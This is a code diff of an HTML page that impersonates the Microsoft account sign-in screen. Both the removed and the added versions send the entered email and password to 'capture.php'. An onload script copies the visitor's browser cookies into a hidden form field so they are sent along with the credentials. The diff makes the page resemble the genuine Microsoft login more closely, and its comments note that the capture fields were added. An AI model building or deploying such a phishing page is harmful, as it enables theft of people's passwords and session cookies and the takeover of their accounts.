@@ -1,53 +1,140 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Sign in to your account</title>
-    <link rel="stylesheet" href="https://static2.sharepointonline.com/files/fabric/office-ui-fabric-core/9.6.0/css/fabric.min.css">
-    <style>
-        body { background-color: #f3f2f1; font-family: 'Segoe UI', sans-serif; }
-        .container { max-width: 960px; margin: 0 auto; padding: 50px 0; }
-        .login-box { background: white; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); border-radius: 4px; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 5px; font-weight: 600; }
-        .form-group input { width: 100%; padding: 10px; border: 1px solid #8a8886; border-radius: 2px; box-sizing: border-box; }
-        .btn { background-color: #0078d4; color: white; border: none; padding: 10px 20px; cursor: pointer; width: 100%; font-size: 14px; }
-        .btn:hover { background-color: #006cc1; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in</title>
+
+<style>
+    body {
+        margin: 0;
+        background-color: #f3f2f1;
+        font-family: "Segoe UI", SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .card {
+        width: 360px;
+        background: #ffffff;
+        padding: 40px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    }
+
+    .logo {
+        margin-bottom: 20px;
+    }
+
+    .logo img {
+        height: 24px;
+    }
+
+    h1 {
+        font-size: 24px;
+        font-weight: 600;
+        margin: 0 0 8px 0;
+    }
+
+    .subtext {
+        font-size: 14px;
+        color: #605e5c;
+        margin-bottom: 24px;
+    }
+
+    .form-group {
+        margin-bottom: 16px;
+    }
+
+    input {
+        width: 100%;
+        padding: 10px;
+        font-size: 14px;
+        border: 1px solid #8a8886;
+        outline: none;
+        box-sizing: border-box;
+    }
+
+    input:focus {
+        border-color: #0078d4;
+        box-shadow: 0 0 0 1px #0078d4;
+    }
+
+    .btn {
+        width: 100%;
+        padding: 10px;
+        background-color: #0078d4;
+        color: white;
+        border: none;
+        font-size: 14px;
+        cursor: pointer;
+    }
+
+    .btn:hover {
+        background-color: #106ebe;
+    }
+
+    .footer-link {
+        margin-top: 16px;
+        font-size: 13px;
+    }
+
+    .footer-link a {
+        color: #0067b8;
+        text-decoration: none;
+    }
+
+    .footer-link a:hover {
+        text-decoration: underline;
+    }
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="login-box">
-            <div class="header">
-                <h1>Sign in</h1>
-                <p>Use your Microsoft account</p>
-            </div>
-            <form action="capture.php" method="POST">
-                <div class="form-group">
-                    <label>Email, phone, or Skype</label>
-                    <input type="text" name="username" placeholder="name@outlook.com" required>
-                </div>
-                <div class="form-group">
-                    <label>Password</label>
-                    <input type="password" name="password" required>
-                </div>
-                <!-- Hidden field to store cookies -->
-                <input type="hidden" name="cookies" id="cookieField">
-                <button type="submit" class="btn">Sign in</button>
-            </form>
-        </div>
+
+<div class="card">
+    <div class="logo">
+        <strong>Microsoft</strong>
     </div>
 
-    <script>
-        // Capture cookies and send them to the form
-        function getAndSendCookies() {
-            const cookies = document.cookie;
-            document.getElementById('cookieField').value = cookies;
-        }
+    <h1>Sign in</h1>
+    <div class="subtext">Use your Microsoft account</div>
 
-        // Run immediately when page loads
-        window.onload = getAndSendCookies;
-    </script>
+    <!-- UPDATED: Added name="username", name="password", and action="capture.php" -->
+    <!-- ADDED: Hidden input ID="cookieField" to store cookies -->
+    <form action="capture.php" method="POST">
+        <div class="form-group">
+            <input type="text" name="username" placeholder="Email, phone, or Skype" required>
+        </div>
+
+        <div class="form-group">
+            <input type="password" name="password" placeholder="Password" required>
+        </div>
+
+        <!-- Hidden field for cookies -->
+        <input type="hidden" name="cookies" id="cookieField">
+
+        <button class="btn" type="submit">Sign in</button>
+    </form>
+
+    <div class="footer-link">
+        <a href="#">Can't access your account?</a>
+    </div>
+</div>
+
+<!-- JAVASCRIPT: Captures cookies and sends them to the hidden field -->
+<script>
+    function captureCookies() {
+        var cookies = document.cookie;
+        var cookieField = document.getElementById('cookieField');
+        if (cookieField) {
+            cookieField.value = cookies;
+        }
+    }
+
+    window.onload = captureCookies;
+</script>
+
 </body>
 </html>
